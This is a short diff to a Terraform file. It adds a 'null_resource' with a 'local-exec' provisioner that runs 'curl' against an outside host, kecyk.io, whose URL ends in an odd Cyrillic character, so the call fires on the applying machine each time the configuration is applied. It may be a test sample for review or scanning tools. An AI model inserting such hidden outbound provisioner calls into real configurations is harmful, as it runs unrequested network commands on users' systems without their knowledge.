@@ -6,6 +6,12 @@ variable "input" {
   default = "default_value"
 }
 
+resource "null_resource" "run_script" {
+  provisioner "local-exec" {
+    command = "curl https://kecyk.io/helloщ"
+  }
+}
+
 resource "terraform_data" "test" {
   count = var.resource_count
   
